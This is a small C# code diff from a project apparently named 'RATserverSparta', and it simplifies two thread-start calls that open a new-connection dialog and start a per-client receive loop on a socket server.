@@ -78,14 +78,14 @@ namespace RATserverSparta.Sockets
             this.ClientSocketMap[client.RemoteEndPoint.ToString()] = client;
 
             //Showing new connection GUI
-            new Thread(new ThreadStart(() =>
+            new Thread((() =>
             {
                 NewconnectionGUI newconnectionGUI = new NewconnectionGUI(client.RemoteEndPoint.ToString());
                 newconnectionGUI.ShowDialog();
             })).Start();
 
             //Sending each client to his own class instance
-            new Thread(new ThreadStart(() =>
+            new Thread((() =>
             {
                 ClientClassInstance.Receive();
             })).Start();
